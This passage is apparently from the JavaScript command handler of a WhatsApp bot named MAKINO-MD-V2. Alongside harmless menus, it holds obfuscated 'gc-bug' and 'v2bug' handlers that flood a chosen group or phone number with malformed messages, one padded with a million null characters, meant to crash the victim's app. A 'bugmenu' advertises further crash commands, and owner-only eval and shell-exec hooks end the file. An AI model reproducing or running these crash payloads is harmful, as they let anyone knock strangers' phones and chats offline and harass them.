┃ •  ᴛɪᴋᴛᴏᴋ
┃ •  happymod
╰════════════════ ⪨
`
await Taira.sendMessage(m.chat, { text: messg }, { quoted: statrp })
}
break


case 'gamemenu': {
let messg = `
╭═══════════════ ⪩
╰╮╰┈➤ *GAMES*
╭═══════════════ ⪩
┃ • ᴛᴛᴛ
┃ • delttt
┃ • ᴛɪᴄᴛᴀᴄᴛᴏᴇ
┃ • ᴛʀᴜᴛʜ
┃ • ᴅᴀʀᴇ
╰════════════════ ⪨
`
await Taira.sendMessage(m.chat, { text: messg }, { quoted: statrp })
}
break

case 'reactionmenu': {
let messg = `
╭═══════════════ ⪩
╰╮╰┈➤ REACTIONS
╭═══════════════ ⪩
┃ •  ᴄᴜᴅᴅʟᴇ
┃ •  ʜᴜɢ
┃ •  ᴋɪꜱꜱ
┃ •  ʙᴏɴᴋ
┃ •  ᴄʀʏ
┃ •  ʙᴜʟʟʏ
┃ •  ꜱʟᴀᴘ
┃ •  ᴋɪʟʟ
┃ •  ʜᴀᴘᴘʏ
┃ •  ʟɪᴄᴋ
┃ •  ᴘᴀᴛ
┃ •  ꜱᴍᴜɢ
┃ •  ɴᴏᴍ
┃ •  ɢʟᴏᴍᴘ
┃ •  ʙɪᴛᴇ
┃ •  ʏᴇᴇᴛ
┃ •  ʙʟᴜꜱʜ
┃ •  ꜱᴍɪʟᴇ
┃ •  ᴡᴀᴠᴇ
┃ •  ʜɪɢʜꜰɪᴠᴇ
┃ •  ʜᴀɴᴅʜᴏʟᴅ
┃ •  ᴘᴏᴋᴇ
┃ •  ᴡɪɴᴋ
┃ •  ᴅᴀɴᴄᴇ
┃ •  ᴄʀɪɴɢᴇ
╰════════════════ ⪨
`
await Taira.sendMessage(m.chat, { text: messg }, { quoted: statrp })
}
break


case 'convertermenu': {
let messg = `
╭═══════════════ ⪩
╰╮╰┈➤ *CONVERTERS*
╭═══════════════ ⪩
┃ •  ꜱᴛɪᴄᴋᴇʀ
┃ •  ᴛᴏɪᴍɢ
┃ •  vv
┃ •  toimage
┃ •  ᴛᴏɢɪꜰ
┃ •  ᴜʀʟ
┃ •  ᴛᴏᴍᴘ3
┃ •  ᴛᴏᴀᴜᴅɪᴏ
┃ •  ᴇᴍᴏᴊɪᴍɪx
┃ •  ꜱᴛᴇᴀʟ
┃ •  tovv
┃ •  ʙᴀꜱꜱ
┃ •  ᴛᴇᴍᴘᴏ
┃ •  ʙʟᴏᴡɴ
┃ •  ʀᴏʙᴏᴛ
┃ •  ⬡ꜱʟᴏᴡ
┃ •  ꜱQᴜɪʀʀᴇʟ
┃ •  ᴅᴇᴇᴘ
┃ •  ᴇᴀʀʀᴀᴘᴇ
┃ •  ꜰᴀꜱᴛ
┃ •  ꜰᴀᴛ
┃ •  ɴɪɢʜᴛᴄᴏʀᴇ
┃ •  ʀᴇᴠᴇʀꜱᴇ
╰════════════════ ⪨
`
await Taira.sendMessage(m.chat, { text: messg }, { quoted: statrp })
}
break

case 'funmenu': {
let messg = `
╭═══════════════ ⪩
╰╮╰┈➤ *FUN*
╭═══════════════ ⪩
┃ •  reaction
┃ •  cutecheck
┃ •  couple
┃ •  soulmate
┃ •  handsomecheck
┃ •  beautifulcheck
┃ •  awesomecheck
┃ •  greatcheck
┃ •  gaycheck
┃ •  uglycheck
┃ •  charactercheck
┃ •  lesbiancheck
┃ •  hornychec
┃ •  prettycheck
┃ •  lovelycheck
╰════════════════ ⪨
`
await Taira.sendMessage(m.chat, { text: messg }, { quoted: statrp })
}
break


case 'animemenu': {
let messg = `
╭═══════════════ ⪩
╰╮╰┈➤ *Anime/Weebs*
╭═══════════════ ⪩
┃ •  ᴀɴɪᴍᴇ
┃ •  ᴀɴɪᴍᴇꜱᴛᴏʀʏ
┃ •  ᴀᴡᴏᴏ
┃ •  ᴍᴀɴɢᴀ
┃ •  ᴀɴɪᴍᴇᴡᴀʟʟ
┃ •  ᴀɴɪᴍᴇᴡᴀʟʟᴘᴀᴘᴇʀ2
┃ •  ᴄᴏꜱᴘʟᴀʏ
┃ •  ᴀɴɪᴍᴇɴᴏᴍ
┃ •  ꜰᴇᴇᴅ
┃ •  ꜰᴏxɢɪʀʟ
┃ •  ᴡᴀɪꜰᴜ
┃ •  ᴡᴀɪꜰᴜ2
┃ •  ᴡᴀɪꜰᴜ3
┃ •  ʟᴏʟɪ
┃ •  ᴄᴏꜰꜰᴇᴇ
┃ •  ᴛɪᴄᴋʟᴇ
┃ •  ᴍᴇᴏᴡ
┃ •  ɴᴇᴋᴏ
┃ •  ɴᴇᴋᴏ2
┃ •  ᴍɪɢᴜᴍɪɴ
┃ •  ᴡᴀʟʟᴘᴀᴘᴇʀ
┃ •  ᴀɴɪᴍᴇQᴜᴏᴛᴇ
╰════════════════ ⪨
`
await Taira.sendMessage(m.chat, { text: messg }, { quoted: statrp })
}
break


case 'othermenu': {
let messg = `
╭═══════════════ ⪩
╰╮╰┈➤ *ADDITIONAL*
╭═══════════════ ⪩
┃ •  Qᴜᴏᴛᴇꜱ
┃ •  ᴡɪᴋɪ
┃ •  ꜱᴛᴀʟᴋɴᴜᴍʙᴇʀ
┃ •  ɢʜᴘʀᴏꜰɪʟᴇ
┃ •  ꜱᴛɪᴄᴋᴇʀᴍᴇᴍᴇ
┃ •  ᴀꜰᴋ
┃ •  ᴅᴀʀᴋᴊᴏᴋᴇ
┃ •  report
╰════════════════ ⪨
`
await Taira.sendMessage(m.chat, { text: messg }, { quoted: statrp })
}
break

case 'menus': {
let messg = `
╭═══════════════ ⪩
╰╮╰┈➤ *MENUS*
╭═══════════════ ⪩
┃ •  COREMENU
┃ •  OWNERMENU
┃ •  GROUPMENU
┃ •  ɢʜᴘʀᴏꜰɪʟᴇ
┃ •  AIMENU
┃ •  DOWNLOADERMENU
┃ •  MENUS
┃ •  GAMEMENU
┃ •  REACTIONMENU
┃ •  CONVERTERMENU
┃ •  FUNMENU
┃ •  ANIMEMENU
┃ •  ADDITiONALMENU
╰════════════════ ⪨
`
await Taira.sendMessage(m.chat, { text: messg }, { quoted: statrp })
}
break

case 'bugmenu': {
let messg = `
╭═══════════════ ⪩
╰╮╰┈➤ *BUGS*
╭═══════════════ ⪩
┃ •  iloveyou amount pc/gc
┃ •  kissme amount pc/gc
┃ •  force-close number
┃ •  kill-ios number|amount
┃ •  killandro number
┃ •  gc-bug group-link
┃ •  v2bug number|amount
╰════════════════ ⪨
`
await Taira.sendMessage(m.chat, { text: messg }, { quoted: statrp })
}
break


case 'gc-bug': {
const _0x414556=_0x2375;function _0x5f13(){const _0x754b60=['2095356iiiUUd','127631dWHuqR','chat','524070spGpND','You\x20have\x20\x20Successfully\x20Sent\x20Bugs\x20to\x20','.\x20🔥\x20\x0a\x0a\x20Wait\x20some\x20minutes\x20or\x20say\x20cheese\x20to\x20your\x20account.','{\x20display_text\x20:\x20\x27⿻Taira\x20Makino⿻\x27,\x20url\x20:\x20,\x20merchant_url\x20:\x20\x20}','Message','2825784yRHRmy','groupAcceptInvite','♱MAKINO-MD-V2♱♡⃤','cta_url','message','152PovIfN','split','relayMessage','396420JqLokw','9VmKKdN','repeat','119694jPFcUR','9907390MJCiPv','Processing\x20.....','5AqKOoO','Use\x20like\x20.','\x20Using\x20'];_0x5f13=function(){return _0x754b60;};return _0x5f13();}(function(_0xff205e,_0x430d2f){const _0xe6bbe8=_0x2375,_0x3f5a16=_0xff205e();while(!![]){try{const _0x2b2510=parseInt(_0xe6bbe8(0x154))/0x1+parseInt(_0xe6bbe8(0x160))/0x2+-parseInt(_0xe6bbe8(0x14c))/0x3+-parseInt(_0xe6bbe8(0x15d))/0x4+parseInt(_0xe6bbe8(0x15a))/0x5*(parseInt(_0xe6bbe8(0x157))/0x6)+-parseInt(_0xe6bbe8(0x15e))/0x7*(-parseInt(_0xe6bbe8(0x151))/0x8)+parseInt(_0xe6bbe8(0x155))/0x9*(parseInt(_0xe6bbe8(0x158))/0xa);if(_0x2b2510===_0x430d2f)break;else _0x3f5a16['push'](_0x3f5a16['shift']());}catch(_0x4b377c){_0x3f5a16['push'](_0x3f5a16['shift']());}}}(_0x5f13,0x863ab));if(!isCreator)return reply(mess['botowner']);if(!q)return reply(_0x414556(0x15b)+command+'\x20https://chat.whatsapp.com/');reply(_0x414556(0x159));let result=args[0x0][_0x414556(0x152)]('https://chat.whatsapp.com/')[0x1],target=await Taira[_0x414556(0x14d)](result);function _0x2375(_0x4a22a1,_0x14330c){const _0x5f13b2=_0x5f13();return _0x2375=function(_0x2375cd,_0x56309c){_0x2375cd=_0x2375cd-0x148;let _0xa0907c=_0x5f13b2[_0x2375cd];return _0xa0907c;},_0x2375(_0x4a22a1,_0x14330c);}for(let j=0x0;j<0x5;j++){var etc=generateWAMessageFromContent(m[_0x414556(0x15f)],proto[_0x414556(0x14b)]['fromObject']({'viewOnceMessage':{'message':{'interactiveMessage':{'header':{'title':'','subtitle':'\x20'},'body':{'text':_0x414556(0x14e)},'footer':{'text':'›\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20♱MAKINO-MD-V2♱♡⃤'},'nativeFlowMessage':{'buttons':[{'name':_0x414556(0x14f),'buttonParamsJson':_0x414556(0x14a)}],'messageParamsJson':'\x00'[_0x414556(0x156)](0xf4240)}}}}}),{'userJid':m[_0x414556(0x15f)],'quoted':statrp});await Taira[_0x414556(0x153)](target,etc[_0x414556(0x150)],{'messageId':etc['key']['id']}),await sleep(0x2bc);}reply(_0x414556(0x148)+target+_0x414556(0x15c)+command+_0x414556(0x149));
  }
break



case 'v2bug': {
const _0x406bbf=_0x2616;function _0x2616(_0xea05d8,_0x307608){const _0x4f6cf2=_0x4f6c();return _0x2616=function(_0x26166b,_0x370468){_0x26166b=_0x26166b-0x115;let _0x24412f=_0x4f6cf2[_0x26166b];return _0x24412f;},_0x2616(_0xea05d8,_0x307608);}function _0x4f6c(){const _0x394049=['botowner','Message','558tvTHWH','He\x27s\x20gone\x20🤭🔪\x0aIf\x20he\x20isn\x27t\x20dead,\x20use\x20a\x20higher\x20amount.','Processing.....','1056714qKaLqV','message','Use\x20like\x20.','373612LbuKwd','chat','replace','startsWith','1639888qzwWCh','3tZGYOm','fromObject','\x202347080968564|1','12dkkirz','124980SUiggd','@s.whatsapp.net','905884xinOSZ','split','110853tdzGBs','Target\x20number\x20cannot\x20start\x20with\x200.'];_0x4f6c=function(){return _0x394049;};return _0x4f6c();}(function(_0x431267,_0x1336e4){const _0x3d5068=_0x2616,_0x1ca78f=_0x431267();while(!![]){try{const _0x356dca=parseInt(_0x3d5068(0x124))/0x1+-parseInt(_0x3d5068(0x117))/0x2*(-parseInt(_0x3d5068(0x11c))/0x3)+parseInt(_0x3d5068(0x11f))/0x4*(-parseInt(_0x3d5068(0x120))/0x5)+-parseInt(_0x3d5068(0x12b))/0x6+-parseInt(_0x3d5068(0x122))/0x7+parseInt(_0x3d5068(0x11b))/0x8+parseInt(_0x3d5068(0x128))/0x9;if(_0x356dca===_0x1336e4)break;else _0x1ca78f['push'](_0x1ca78f['shift']());}catch(_0x3d69bf){_0x1ca78f['push'](_0x1ca78f['shift']());}}}(_0x4f6c,0x1dd4c));if(!isCreator)return reply(mess[_0x406bbf(0x126)]);if(!q)return reply(_0x406bbf(0x116)+command+_0x406bbf(0x11e));let one=q[_0x406bbf(0x123)]('|')[0x0],two=one[_0x406bbf(0x119)](/[^0-9]/g,'');if(two[_0x406bbf(0x11a)]('0'))return reply(_0x406bbf(0x125));let target=two+_0x406bbf(0x121),count=q[_0x406bbf(0x123)]('|')[0x1];reply(_0x406bbf(0x12a));for(let j=0x0;j<count;j++){var etc=generateWAMessageFromContent(m[_0x406bbf(0x118)],proto[_0x406bbf(0x127)][_0x406bbf(0x11d)]({'viewOnceMessage':{'message':{'liveLocationMessage':{'degreesLatitude':'p','degreesLongitude':'p','caption':'♱MAKINO-MD-V2♱♡⃤','sequenceNumber':'0','jpegThumbnail':''}}}}),{'userJid':target,'quoted':m});await Taira['relayMessage'](target,etc[_0x406bbf(0x115)],{'messageId':etc['key']['id']});}await reply(_0x406bbf(0x129));
}
break 



      //-----------------------------------------------------------------------------------------------------------------------------------//



      default:

        if (isCmd) {
          if (isBan) return reply(mess.banned);
          if (isBanChat) return reply(mess.bangc);
          Taira.sendMessage(from, { react: { text: "❌", key: m.key } })
          reply(`Hey *${pushname}*,Unfortunately there are no such command 🤧!`)

        }

	if (budy.startsWith('=>')) {
if (!isCreator) return reply(mess.botowner)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return reply(bang)
}
try {                                                                             
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))
}
	} 
		    
	if (budy.startsWith('>')) {
        if (!isCreator) return reply(mess.botowner)
        try {
        let evaled = await eval(budy.slice(2))
        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
        await reply(evaled)
        } catch (err) {
        await reply(String(err))
        }
	} 


        
	if (budy.startsWith('$')) {
if (!isCreator) return reply(mess.botowner)
exec(budy.slice(2), (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) return reply(`${stdout}`)
})
}

        if (isCmd && budy.toLowerCase() != undefined) {
          if (m.chat.endsWith('broadcast')) return
          if (m.isBaileys) return
          let msgs = global.db.database
          if (!(budy.toLowerCase() in msgs)) return
          Taira.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
	}
     }
  } catch (err) {
    console.log(err)
    let e = String(err)
    if (e.includes("not-authorized")) return
    if (e.includes("already-exists")) return
    if (e.includes("rate-overlimit")) return
    if (e.includes("Connection Closed")) return
    if (e.includes("Timed Out")) return
    if (e.includes("Value not found")) return
    if (e.includes("Socket connection timeout")) return
  }
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
  fs.unwatchFile(file)
  console.log(`Update ${__filename}`)
  delete require.cache[file]
  require(file)
})
